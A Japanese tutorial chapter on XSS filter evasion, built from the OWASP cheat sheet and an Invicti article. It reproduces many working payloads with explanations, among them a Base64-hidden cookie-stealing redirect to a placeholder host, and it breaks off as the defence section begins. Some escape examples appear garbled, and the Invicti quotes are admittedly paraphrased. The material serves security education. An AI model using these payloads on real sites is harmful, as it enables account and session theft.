## フィルタ回避（OWASP / Invicti）

反射型の素朴なXSS（Cross-Site Scripting: 攻撃者が仕込んだ文字列が、ブラウザによって「データ」ではなく「コード（スクリプト）」として解釈・実行されてしまう脆弱性）を知っている読者が次に必ずぶつかる壁が、「開発者が入れたフィルタ（危険そうな入力を検出して弾く仕組み）を、攻撃者はどうやってすり抜けるのか」という問題です。

このセクションでは、この主題に関する2つの古典的かつ重要な資料を精読・統合します。

1. **OWASP XSS Filter Evasion Cheat Sheet** — フィルタ回避の具体的技法を網羅した「攻撃側の辞書」。無数のペイロード（攻撃を成立させる実際の入力文字列）を、なぜそれが動くのかという原理とともに並べたカタログです。
2. **Invicti「XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting」** — 「そもそも、なぜフィルタリングという方式ではXSSを止められないのか」という、より上位の原理を論じた記事。前者が「どう破るか」なら、後者は「なぜ破れてしまうのか、では何をすべきか」を扱います。

この2つは表裏一体です。回避技法カタログ（OWASP）を眺めるだけでは「モグラ叩き」の知識で終わってしまいますが、Invictiの原理と重ね合わせると、「フィルタ（ブラックリスト方式）という戦略そのものが構造的に敗北する」理由が腹落ちします。本セクションの価値の中心は、個々のペイロードの丸暗記ではなく、**なぜブラウザはそんな壊れた入力まで実行してしまうのか**という「仕組みのレベルの理解」にあります。

> このセクションの資料は、いずれも自動取得の際にネットワーク側のエグレス制限（外部サイトへの直接アクセスを制限する仕組み）で直接アクセスがブロックされました。ただし、
> - 資料1（OWASP）は、OWASPがGitHub上で公開している原本Markdown（`raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md`）が、ブロックされたHTMLページと**同一内容の一次ソース**であるため、そちらを精読して内容を完全に復元しています。
> - 資料2（Invicti）は、原記事そのものへの直接アクセスができなかったため、Web検索によって記事の主要な主張・結論・引用を複数回にわたって突き合わせ、**実質的な内容を復元**しました（原文の逐語ではなく、要点の再構成です。厳密な原文は末尾のURLからご確認ください）。
>
> したがって本セクションは両資料とも「実質的な内容を取得済み」として記述しています。

---

### 1. Invictiの中心命題：なぜ「フィルタリング」ではXSSを止められないのか

まず上位の原理から入ります。多くの開発者は、XSS対策として「入力に `<script>` や `javascript:` が含まれていたら削除・拒否する」といった**フィルタ（filter: 危険なパターンを検出して除去・遮断する処理）**を書きます。しかしInvictiの記事は、この方式が原理的に破綻していると断言します。その論拠は次のとおりです。

#### 1.1 ブラウザは「壊れたHTML」を全力で直して実行してしまう

最重要の論点です。Invictiはこう述べます。

> 「モダンなブラウザ（Chrome、Firefox、Internet Explorer、Edgeなど）は、不正な（malformed: 文法的に不正確・破損している）HTMLに対して非常に寛容で、たいていの場合それでもページを描画しようとする。」

> 「どのブラウザでも、コードベースの大きな部分が、壊れたHTML・CSS・JavaScriptを“優雅に処理”して、ユーザーに見せる前に修復しようとすることに費やされている。」

つまりブラウザには、閉じ忘れたタグ、余分な引用符、規格外の属性といった「壊れた入力」を、独自のルールで**勝手に補完・修復して正しいHTMLツリーに作り直す**巨大なエラー回復ロジックが組み込まれています。これはWeb黎明期の「多少ぐちゃぐちゃなHTMLでもページが表示される」というユーザー体験を守るための設計であり、HTML仕様（HTML Standard）自体が「パースエラー時にどう回復するか」を細かく定めています。

ここに罠があります。**開発者のフィルタが見ている「文字列」と、ブラウザが最終的に組み立てる「HTMLツリー」は別物**なのです。フィルタは `<script>` という完全な文字列を探しますが、攻撃者は `<scr<script>ipt>` のような「フィルタには一致しないが、ブラウザが修復すると `<script>` に化ける」入力を送れます。フィルタが「無害」と判定した文字列を、ブラウザが「有害なコード」へと復元してしまう——この非対称性がフィルタ回避の温床です。

#### 1.2 JavaScriptの構文が「同じことを何通りにも書ける」ほど柔軟

> 「JavaScriptの構文は非常に柔軟で寛容（flexible and permissive）であり、同じ操作を表現する方法が何通りもある。」

たとえば `alert(1)` を呼ぶだけでも、後述するように `(alert)(1)`、`window['al'+'ert'](1)`、`top[/al/.source+/ert/.source](1)` のように無数の書き方があります。ブラックリスト（禁止パターンの一覧）で `alert` という文字列を弾いても、`alert` と書けば通ってしまう。**表現の組み合わせが事実上無限**であるため、「危険な表現の一覧」を数え上げる方式（ブラックリスト）は必ず取りこぼします。

#### 1.3 `<script>` を塞いでも実行経路は他にいくらでもある

> 「`<script>` タグの注入は通常ブロックされるが、攻撃者は `onerror`・`onclick`・`onfocus` などの**イベントハンドラ（event handler: 特定の出来事＝クリックや読み込み失敗などが起きたときに実行されるコードを指定する属性）**を使い、ユーザーの操作やページの状態変化に応じてJavaScriptを実行する。」

`<img src=x onerror=alert(1)>` は `<script>` を一文字も含みませんが、画像読み込みが失敗した瞬間にJavaScriptが走ります。JavaScriptを起動できる「入口」はタグ・属性・スキーム（`javascript:` や `data:`）・CSS など多岐にわたり、`<script>` はそのごく一部にすぎません。

#### 1.4 エンコーディングは「入れ子」にできる

> 「攻撃者は1文字〜複数文字をさまざまな形式でエンコードでき、しかもエンコーディングは異なる方式で入れ子（nested）にできる。複数のエンコード方式を組み合わせられるため、検出はさらに困難になる。」

たとえば `javascript:` を、HTML実体参照（`&#106;...`）→URLエンコード（`%6A...`）→さらにその一部だけ16進、と多層に包めます。フィルタはどこか一段だけデコードして検査しがちですが、ブラウザは文脈に応じて何段もデコードしてから実行します。**フィルタのデコード段数とブラウザのデコード段数がずれる**限り、抜け道が残ります。

#### 1.5 結論：フィルタ／WAFは「安心という幻想」を生む

Invictiの結論は明快です。

> 「特定のペイロードをブロックしても、根本の脆弱性を直さなければ、“安全になったという誤った安心感（a false sense of security）”を生むだけで、WAFが検知できない新しいペイロードには依然として無防備なままだ。」

> 「どれほど複雑なXSSフィルタや優秀なWAFを用意しても、賢いハッカーが侵入路を見つけないことを完全に保証することは決してできない。」

ここで **WAF（Web Application Firewall: Webアプリの前段に置き、通信を監視して既知の攻撃パターンを遮断する防御機器・サービス）** は、既知の露骨なペイロードを弾く一時的な緩和策にはなるものの、「アプリケーションの文脈（そのデータが最終的にどこでどう使われるか）」を持たないため、ソースコード側の正しい対策の**代替にはならない**と位置づけられます。

そしてInvictiが示す唯一信頼できる方向性が次です。

> 「XSSとフィルタ回避を確実に防ぐ唯一の方法は、“フィルタリング（filtering）”ではなく“エスケープ（escaping）”を使うことである。」

この「エスケープ／出力エンコーディング」中心の防御論は本章末（1.10）と第1章の防御セクションで深掘りするため、ここでは「フィルタは戦略的に負ける／エスケープが正攻法」という結論だけ押さえてください。

> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting (Invicti) — https://www.invicti.com/blog/web-security/xss-filter-evasion

---

### 2. OWASPフィルタ回避チートシートの位置づけと読み方

OWASP XSS Filter Evasion Cheat Sheetは、上記Invictiの主張を「具体的な弾丸」で裏づける資料です。もともとはRSnake（Robert Hansen）が公開した伝説的な「XSS Cheat Sheet」を起源とし、現在はOWASPが保守しています。

チートシートは冒頭で自らの目的をこう明言します。

> 「この記事は、アプリケーションセキュリティのテスト担当者に向けて、**特定のXSS防御フィルタをすり抜けられる一連のXSS攻撃**を提供することで、入力フィルタリングがXSSに対する不完全な防御であることを実証するものである。」

つまりこれは「攻撃者のための攻撃辞書」であると同時に、「フィルタは破れる、という主張の証拠集」でもあります。防御側にとっては「自分のフィルタがこれらに耐えられるか」のテストケース集として使います。

重要な前提として、掲載ペイロードの多くは**ブラウザ・バージョン依存**です。とりわけ古いInternet Explorer（Trident）や旧Firefox（Gecko）の独自挙動を突くものが多く、現在のモダンブラウザでは動かないものが相当数あります（第9節で「陳腐化」の注意として整理します）。しかし「なぜ当時動いたのか」の原理はいまも有効で、現代の回避（サニタイザ回避やmutation XSSなど）を理解する土台になります。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

以下、チートシートの技法を系統立てて解説します。ペイロードは原文のものを再現し、それぞれに「なぜ動くのか」を一文添えます。

---

### 3. 基本のバリエーション：大文字小文字・引用符・属性の“ゆらぎ”

最初のグループは、最も素朴なフィルタ（「`<script>` という文字列を探す」「`javascript` という語を探す」）を破る、表面的だが本質的な変形です。

#### 3.1 大文字小文字混在

```html
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

なぜ動くか: HTMLのタグ名・属性名・`javascript:` スキーム名はいずれも**大文字小文字を区別しない**。フィルタが小文字の `javascript` だけを探していると、`JaVaScRiPt` を見逃す。

#### 3.2 引用符の有無・種類のゆらぎ

```html
<IMG SRC=javascript:alert('XSS')>
<IMG SRC="javascript:alert('XSS')">
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

なぜ動くか: HTML属性値は「二重引用符」「一重引用符」「引用符なし」のいずれでも書ける。さらに古いIEはバッククォート `` ` `` すら引用符として受理した。フィルタが特定の引用符スタイルだけを想定していると破られる。

#### 3.3 属性値の途中に無意味な断片・空白を挟む

```html
<IMG SRC=" onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=# onmouseover="alert('xxs')">
```

なぜ動くか: `src` の値がなくても（あるいは無効でも）、`onmouseover` などのイベントハンドラ属性さえ生き残れば実行される。フィルタが「`src=javascript:` の形」だけを警戒していると、イベントハンドラ経由の実行を止められない。

#### 3.4 タグ名と属性の区切りをスラッシュにする

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

なぜ動くか: HTMLパーサはタグ名と属性の区切りに空白だけでなくスラッシュ `/` も受理する。`<script src=...>` を正規表現で厳密に空白区切りで探すフィルタは、`/` 区切りを取りこぼす。

#### 3.5 イベントハンドラ名の直後に非英数字を詰め込む（Gecko）

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

なぜ動くか: 旧Geckoエンジンは、属性名 `onload` と等号 `=` の間に大量の非英数字が挟まっても、それらを無視して属性として解釈した。属性名を正規表現で厳密に照合するフィルタを崩す。（現行ブラウザでは不成立。原理として理解する例。）

---

### 4. 文字参照（実体参照）エンコーディング

ここからがフィルタ回避の主戦場です。**文字参照（character reference／実体参照 entity reference: `&#106;` や `&#x6A;` のように、1文字を数値コードで表す記法。ブラウザは表示・解釈の前にこれを元の文字へ復号する）**を使うと、`javascript` という語を一文字も「そのまま」書かずに表現できます。

#### 4.1 10進数の実体参照

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```

なぜ動くか: これは `javascript:alert('XSS')` を1文字ずつ10進数実体参照にしたもの。フィルタは `href` の中に `javascript` という文字列を見つけられないが、ブラウザは属性値を解釈する前に実体参照を復号し、`javascript:` スキームとして実行する。

#### 4.2 16進数の実体参照（かつ末尾セミコロンを省略）

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click</a>
```

なぜ動くか: 実体参照は16進（`&#x...`）でも書け、しかも**末尾のセミコロン `;` を省略しても**多くのブラウザは復号する。フィルタが「`&#\d+;`（10進かつセミコロン付き）」というパターンだけを想定していると、16進＋セミコロン無しの二重の変形で抜けられる。

#### 4.3 先頭ゼロによるパディング

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058...">Click</a>
```

なぜ動くか: 数値実体参照は**先頭のゼロ（padding）を任意個数付けても同じ文字**として復号される（1〜7桁程度まで許容し、先頭ゼロは無視される）。つまり同じ1文字に無限通りの表記があり、フィルタは全パターンを列挙できない。これは1.2で述べた「同じものを何通りにも書ける」原理の具体例。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 5. 制御文字・空白・Nullバイトによる「キーワード分断」

`javascript:` という危険なキーワードそのものを、途中に「ブラウザは無視するが文字列としては割り込む」文字を挟んで分断する技法です。

#### 5.1 タブ・改行・復帰の埋め込み

```html
<a href="jav	ascript:alert('XSS');">Click Me</a>
<a href="jav&#x0A;ascript:alert('XSS');">Click Me</a>
<a href="jav&#x0D;ascript:alert('XSS');">Click Me</a>
```

なぜ動くか: `jav` と `ascript` の間に、水平タブ（ASCII 0x09）・改行（0x0A）・復帰（0x0D）を「生の文字」または実体参照で挿入している。ブラウザはスキーム名 `javascript` の内部にあるこれらの空白・制御文字を**取り除いてから**解釈するため、依然として `javascript:` と認識する。一方フィルタは `jav\tascript` を `javascript` と一致させられない。1文字目の例のタブは、原文では生のタブ文字が埋め込まれている点に注意。

#### 5.2 Nullバイト（ヌルバイト）注入

```
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

なぜ動くか: **Nullバイト（null byte: 値がゼロの1バイト。C言語系では文字列の終端記号）**を `java` と `script` の間に挟む。かつてのIEはこのNull（`\0`、URL上では `%00`）を無視してタグを解釈したが、C言語で書かれた検査ロジックはNullで文字列が終わったと誤認し、そこで検査を打ち切ってしまう。**ブラウザとフィルタの文字列終端の解釈差**を突く古典。

#### 5.3 「空白扱いされる制御文字」を先頭に置く

```html
<a href=" &#14;  javascript:alert('XSS');">Click Me</a>
```

なぜ動くか: `href` の値の先頭にある空白や制御文字（ここでは `&#14;`）を、ブラウザはトリム（除去）してから `javascript:` を認識する。フィルタが「`javascript:` で始まる値」だけを危険視していると、前置きされたゴミで先頭一致を外せる。ASCII 1〜32付近の多くの文字がこの用途に使える。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 6. タグ構造の破壊とブラウザの自動修復

1.1で述べた「ブラウザは壊れたHTMLを直して実行する」を、実際のペイロードで体感する節です。ここが**フィルタ回避の理論的な核心**です。

#### 6.1 余分な引用符・角括弧でパーサを混乱させる

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

なぜ動くか: 1行目は、壊れた `<IMG """>` をブラウザが「不正な img タグ」として処理・修復した結果、後続の `<SCRIPT>` が独立したタグとして生き残り実行される。2行目の `<<SCRIPT>` は、先頭の余分な `<` をブラウザがテキストとして捨て、`<SCRIPT>` を正しいタグとして拾う。**フィルタは「壊れた文字列」を見て安全と誤判定するが、ブラウザは修復して危険なツリーを作る**——非対称性そのもの。

#### 6.2 閉じ忘れ・省略

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
<SCRIPT SRC=//xss.rocks/.j>
```

なぜ動くか: 1行目は `</script>` を書かず、代わりに `< B >` で「次のタグ開始」らしきものを与えることで、ブラウザにスクリプト部の終端を推測・補完させる。2行目はプロトコル（`http:`）とファイル拡張子（`.js`）を省略してもブラウザが補完して読み込む。厳密な文法を期待するフィルタほど、この「省略に強いブラウザ」に負ける。

#### 6.3 タグ内でのHTMLコメントによる分断

```html
<IMG SRC="javas<!-- -->cript:alert('XSS')">
```

なぜ動くか: 一部の文脈でブラウザはコメント `<!-- -->` を除去してから値を解釈し、`javascript:` を復元する。フィルタはコメントで分断された `javas...cript` を危険語と認識できない。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 7. 代替タグとイベントハンドラ：`<script>` に頼らない実行経路

Invictiの1.3を、OWASPの具体例で網羅します。JavaScriptを起動できる「入口」がいかに多いかを示すカタログです。

#### 7.1 画像タグと `onerror`

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
<IMG SRC=x onerror="alert('XSS')">
```

なぜ動くか: `src` に無効な値を与えると画像読み込みが必ず失敗し、`onerror` に指定したコードが実行される。`<script>` を含まず、正当なタグ（img）だけで成立するため、タグ単位のブラックリストをすり抜ける。`String.fromCharCode(88,83,83)` は文字コードから `"XSS"` を生成しており、引用符や文字列そのものをフィルタされても値を組み立てられる。

#### 7.2 SVGの `onload`（現代でも有効な代表格）

```html
<svg/onload=alert('XSS')>
```

なぜ動くか: SVG要素は読み込み完了時に `onload` を発火する。短く、引用符も空白も最小限で書けるため、現在も生きたペイロードとして頻出。**名前空間の切り替え**（後述9.2）とも絡み、サニタイザ回避の主役でもある。

#### 7.3 IE独自の代替ソース属性（歴史的）

```html
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<TABLE BACKGROUND="javascript:alert('XSS')">
```

なぜ動くか: 旧IEは `dynsrc`・`lowsrc`・`background` など、画像URLを取る多数の属性で `javascript:` スキームを実行した。「危険なのは `src` だけ」という思い込みを崩す例（現行ブラウザでは不成立）。

#### 7.4 iframe・frame・object・embed

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
<EMBED SRC="data:image/svg+xml;base64,PHN2Zy...=="></EMBED>
```

なぜ動くか: 埋め込み系タグは外部・インラインのコンテンツをロードでき、その中でスクリプトが走る。とくに `data:` スキーム（後述8.2）と組み合わせると、外部サーバすら不要でSVG内スクリプトを実行できる。

#### 7.5 BASEタグによる相対URLの乗っ取り

```html
<BASE HREF="javascript:alert('XSS');//">
```

なぜ動くか: `<base>` はページ内の相対URLの基準を書き換える。基準を `javascript:` にすると、後続の相対リンク・スクリプト読み込みがすべて汚染される。ページの一部分だけを注入できる状況で威力を持つ。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 8. JavaScript／URLレベルの難読化

`<script>` の実行までは通っても、その中身（`alert` や文字列）をフィルタされる場合に、コードそのものを覆い隠す技法です。

#### 8.1 `String.fromCharCode` と Unicodeエスケープ

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
<form><a href="javascript:alert(1)">X</a></form>
```

なぜ動くか: `String.fromCharCode(88,83,83)` は数値から文字列を組み立てるので、フィルタしたい文字（引用符や `XSS`）を一切書かずに値を作れる。`alert` は `alert` の `a` をUnicodeエスケープ（`a`＝`a`）で表したもので、JavaScriptエンジンは字句解析（トークン化）の段階でこれを `a` に復号するため、識別子として正しく `alert` になる。**フィルタは `alert` という並びを見つけられないが、エンジンにとっては同一**。

#### 8.2 `data:` スキームとBase64

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
<iframe src="data:text/html,%3Cscript%3Ealert(1)%3C/script%3E"></iframe>
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

なぜ動くか: **`data:` スキーム（URL自体にコンテンツの中身を埋め込む記法。外部サーバを介さずにHTML/画像等を供給できる）**にHTML文書やスクリプトをそのまま、あるいはBase64（任意のバイト列を英数字だけで表す符号化）で包んで置く。`atob()` はBase64を復号する組み込み関数で、`eval(atob('...'))` は「復号してから実行」を意味する。フィルタが英数字の羅列（Base64）を危険と気づけない点を突く。

#### 8.3 `alert` そのものの難読化（プロトタイプチェーンの悪用）

```js
(alert)(1)
a=alert,a(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
alert(1)
top['al\145rt'](1)
top[8680439..toString(30)](1)
alert?.()
```

なぜ動くか: JavaScriptでは、関数はオブジェクトのプロパティとしてブラケット記法（`obj["name"]`）でも呼べる。`top` はグローバルオブジェクト（ブラウザでは `window`）を指し、そのプロパティ探索は**プロトタイプチェーン（prototype chain: オブジェクトが自分に無いプロパティを、親→その親…とたどって探す仕組み）**の先頭であるグローバルスコープに解決される。つまり `top["alert"]` は `window.alert` と同じ。あとは `"al"+"ert"`（文字列結合）、`/al/.source+/ert/.source`（正規表現リテラルの `source` から文字列を取り出して結合）、`'al\145rt'`（8進エスケープ `\145`＝`e`）、`8680439..toString(30)`（30進数へ基数変換すると文字列 `"alert"` になる）など、**「`alert` という連続した文字列を一度も書かずに」同じプロパティ名を生成**している。ブラックリストで語 `alert` を弾いても、これらは素通りする。`alert?.()` はオプショナルチェーン `?.` を使い、`alert(` という並びすら崩している。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 9. CSS・メタ・サーバサイド・その他の“隙”

#### 9.1 スタイルシート経由（主に旧IE）

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

なぜ動くか: 旧IEはCSSの `expression()`（CSS値をJavaScript式で計算するIE独自拡張）や `url(javascript:...)` を実行し、旧Firefoxは `-moz-binding`（XBLという仕組みで要素に振る舞いを束縛するGecko拡張）で外部スクリプトを読み込めた。「CSSは見た目だけで無害」という思い込みを崩す例。`@import` は外部CSSを読み込む指令。（`expression`・`-moz-binding` は現行ブラウザで廃止済み。原理として押さえる。）

#### 9.2 メタリフレッシュとURLパラメータ操作

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
```

なぜ動くか: `<meta http-equiv="refresh">` は指定秒後に指定URLへ遷移させる。その遷移先に `javascript:` を置くと実行される。`url=` を二重に書く2行目は、フィルタが最初の `url=` だけを検査する挙動を突く。

#### 9.3 サーバサイド・インクルードと条件付きコメント

```html
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
```

なぜ動くか: 1行目はSSI（Server Side Includes: サーバがHTML内の特殊コメントをコマンドとして実行する機能）を悪用し、`<SCR`＋`IPT ...`を**サーバ側で結合**して完成した `<SCRIPT>` を出力する。フィルタが見る入力には完全な `<SCRIPT>` が存在しない。2行目はIEのダウンレベル隠しコメント（`[if gte IE 4]`＝IE4以上でのみ有効な条件分岐コメント）で、非IEブラウザやフィルタにはただのコメントに見える。

#### 9.4 HTTPパラメータ汚染（HPP）

同名パラメータを複数送り、フィルタが1つ目だけを検査する隙を突きます。

```
/share?content_type=1&title=regular&content_type=1;alert(1)
```

なぜ動くか: **HPP（HTTP Parameter Pollution: 同じ名前のパラメータを複数与え、サーバ／各処理層ごとに“どれを採用するか”の解釈が食い違うことを利用する攻撃）**。あるページはHTMLエンコード、別ページはJavaScriptエンコードしかしない、といった処理の不整合と組み合わさると、エンコードの穴を通って `content_type = 1;alert(1)` が実行に至る。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 10. 現代的なWAFバイパスとポリグロット

チートシート末尾には、より新しいWAF回避向けの実戦ペイロードがまとまっています。抜粋します。

```html
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
<a aa aaa aaaa ... href=j&#97v&#97script:&#97lert(1)>ClickMe</a>
<form><button formaction=javascript&colon;alert(1)>CLICKME</button></form>
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;">
<img src="x:gif" onerror="window['alert'](0)"></img>
```

なぜ動くか: これらは本セクションの技法を**組み合わせて**いる典型例です。`&colon;`（`:` のHTML実体名参照）・`&lpar;`（`(`）・`&period;`（`.`）で記号を実体参照化し、`e` でUnicodeエスケープ、`%00`（Nullバイト）でコメントやパスを分断、`throw` や `window.onerror=alert` で `alert()` という呼び出し形すら回避しています。1つのペイロードに複数のデコード層と代替経路を重ねることで、単純なパターン照合では到底追いつかなくなります。

さらにチートシートは、複数の文脈（HTMLコンテキスト、属性内、JavaScript文字列内、URL内）のどこに落ちても発火する**ポリグロット（polyglot: 複数の言語・文脈で同時に有効になるように作られた1本の万能ペイロード）**の考え方も紹介します。代表的なものにGareth Heyesのポリグロットがあります（原理: 各文脈での「脱出（break out）」に必要な記号を1本に詰め込み、どの文脈でもどこかで実行に至るようにする）。

> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 11. まとめ：なぜこれらは動くのか（原理の統合）

ここまでの膨大なペイロードは、突き詰めると**わずか数個の原理**の組み合わせに還元できます。回避技法を丸暗記する必要はなく、この原理を理解していれば新種のペイポードも「なぜ動くか」を自力で説明できます。

1. **パースとフィルタの非対称性**: フィルタは「入力文字列」を見るが、ブラウザは「修復・復号したあとのHTMLツリー／トークン列」を実行する。この2つがずれる限り抜け道は必ず残る（第6章の核心）。
2. **多層デコード**: HTML実体参照 → URLエンコード → JavaScript文字列エスケープ …と、ブラウザは文脈ごとに何段もデコードする。フィルタのデコード段数がブラウザより浅ければ突破される（第4・5・8章）。
3. **表現の非一意性**: 同じ1文字・同じ関数呼び出しに、事実上無限の表記がある（先頭ゼロ、大文字小文字、`fromCharCode`、`toString(基数)`、プロパティ名の文字列結合など）。ブラックリストは有限、表現は無限（第3・8章）。
4. **実行経路の多さ**: JavaScriptは `<script>` だけでなく、イベントハンドラ・`javascript:`/`data:` スキーム・CSS・meta refresh・埋め込みタグからも起動する。1つの入口を塞いでも他が開いている（第7・9章）。
5. **名前空間の切り替え（mutation XSSの土台）**: HTMLパーサは、`<svg>` や `<math>` の内側では**HTML名前空間から外部（foreign content）名前空間へ規則を切り替える**。この境界で、サニタイズ後の文字列がブラウザによって別の構造へ“変異（mutate）”することがある。これが後述のmutation XSSの根本原理。

---

### 12. バージョン依存の回避に注意（陳腐化と、現代のサニタイザ回避）

（以下は、2つの資料の内容を現代の文脈へ接続するための、一般的な知識に基づく補足解説です。）

OWASPチートシートのペイロードは歴史的資産であり、**多くがブラウザ・バージョン依存**です。学習時は「いま動くか」と「なぜ当時動いたか」を分けて考えてください。

- **すでに廃止・無効化された代表例**: CSSの `expression()`（IE限定、IE11以降で廃止）、`-moz-binding`（Firefox 57 / 2017年頃までにXBLごと廃止）、`DYNSRC`/`LOWSRC`（旧IE専用）、VBScriptスキーム（Edge以降で廃止）。これらは現行のChrome/Firefox/Safari/Edgeでは動作しません。
- **いまも生きている核**: `<svg onload>`、`<img onerror>`、`javascript:`/`data:` スキーム、実体参照や `\u` エスケープによる難読化は、文脈次第で現在も有効です。

現代のXSS回避の主戦場は、素のフィルタではなく**HTMLサニタイザ・ライブラリの回避**へ移りました。とくに **DOMPurify**（ユーザー入力HTMLから危険な要素・属性を除去する、事実上の標準ライブラリ）を対象とする **mutation XSS（mXSS: サニタイズは正しく行われたのに、その出力を `innerHTML` へ再代入した瞬間にブラウザのパーサが構造を“変異”させ、無害だったはずのマークアップが実行可能なコードに化ける現象）** が代表例です。原理は第11章の「5. 名前空間の切り替え」そのもので、`<svg>`/`<math>`/`<template>`/`<style>` の境界でのパース規則の食い違いを突きます。

具体的なバージョン依存の例（対象バージョン・修正・公開年を明記）:

- **DOMPurify < 2.0.17（修正: 2.0.17、2020年公開）**: Michał Bentkowski らが報告した、要素のネスト（入れ子）と名前空間の混同を利用したmXSSバイパス。この版までは、サニタイズ後の文字列が `innerHTML` 再解釈時に危険な構造へ復元され得た。2.0.17で修正。
- **DOMPurify 2.2.x〜2.3.x台のバイパス（各パッチで順次修正、2021〜2022年）**: `<style>`／コメント／foreign content の扱いを突く複数のmXSSが継続的に報告・修正された。
- **現行（DOMPurify 3.x、2023年以降）**: 多数の既知mXSSは塞がれているが、「サニタイザは常に最新へ保つ」「出力先コンテキストを固定する」ことが前提。**古いバージョンを使い続けること自体が脆弱性**になる、という点が実務上の教訓です。

つまり、OWASPチートシートが示した「ブラウザは壊れた入力を修復して実行する」という20年来の原理は、フィルタからサニタイザへと対象を変えつつ、現在も生き続けています。

---

### 13. では何をすべきか：正しい防御（結論）

Invictiとチートシートの結論は一致しています。**「危険なものを探して消す（フィルタ／ブラックリスト）」を主対策にしてはならない。「出力先で無害化する（エスケープ／エンコード）」を主対策にせよ。** 具体的な指針は次のとおりです。

1. **コンテキスト依存の出力エンコーディング（context-aware output encoding）を主対策にする。**
